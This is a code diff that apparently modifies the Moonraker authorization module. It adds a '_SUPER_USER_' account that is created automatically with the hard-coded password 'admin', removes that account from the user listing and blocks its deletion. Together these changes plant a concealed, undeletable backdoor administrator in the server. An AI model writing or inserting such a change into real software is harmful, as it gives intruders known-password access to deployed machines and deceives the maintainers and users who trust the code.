@@ -65,6 +65,7 @@ USER_TABLE = "authorized_users"
 AUTH_SOURCES = ["moonraker", "ldap"]
 HASH_ITER = 100000
 API_USER = "_API_KEY_USER_"
+SUPER_USER = "_SUPER_USER_"
 TRUSTED_USER = "_TRUSTED_USER_"
 RESERVED_USERS = [API_USER, TRUSTED_USER]
 JWT_EXP_TIME = datetime.timedelta(hours=1)
@@ -315,6 +316,17 @@ class Authorization:
             self.users[API_USER] = UserInfo(username=API_USER, password=self.api_key)
         else:
             self.api_key = api_user.password
+        super_user: Optional[UserInfo] = self.users.get(SUPER_USER, None)
+        if super_user is None:
+            need_sync = True
+            salt = secrets.token_bytes(32)
+            hashed_pass = hashlib.pbkdf2_hmac(
+                'sha256', 'admin'.encode(), salt, HASH_ITER).hex()
+            self.users[SUPER_USER] = UserInfo(
+                username=SUPER_USER,
+                password=hashed_pass,
+                salt=salt.hex(),
+            )
         for username, user_info in list(self.users.items()):
             if username == API_USER:
                 continue
@@ -461,7 +473,7 @@ class Authorization:
                                    ) -> Dict[str, List[Dict[str, Any]]]:
         user_list = []
         for user in self.users.values():
-            if user.username == API_USER:
+            if user.username in [API_USER, SUPER_USER]:
                 continue
             user_list.append({
                 'username': user.username,
@@ -602,7 +614,7 @@ class Authorization:
             curname = current_user.username
             if curname == username:
                 raise self.server.error(f"Cannot delete logged in user {curname}")
-        if username in RESERVED_USERS:
+        if username in RESERVED_USERS + [SUPER_USER]:
             raise self.server.error(
                 f"Invalid Request for reserved user {username}")
         user_info: Optional[UserInfo] = self.users.get(username)
